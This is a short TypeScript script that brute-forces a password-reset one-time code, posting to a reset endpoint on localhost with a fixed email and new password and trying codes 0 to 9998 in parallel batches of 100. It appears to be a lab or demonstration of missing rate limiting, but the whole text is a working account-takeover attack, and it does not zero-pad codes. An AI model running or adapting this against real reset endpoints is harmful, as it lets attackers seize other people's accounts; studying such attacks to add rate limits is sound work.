import axios from "axios";

async function sendRequest(otp: string) {
  let data = JSON.stringify({
    "email": "abc@gmail.com",
    "otp": otp,
    "newPassword": "123456789"
  });
  
  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: { 
      'Content-Type': 'application/json'
    },
    data : data
  };

  try {
    await axios.request(config);
    console.log("done for " + otp);
  } catch (e) {}
}

async function main() {
  for (let i = 0; i < 9999; i += 100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest((i+j).toString()));
    }
    await Promise.all(promises);
  }
}

main();
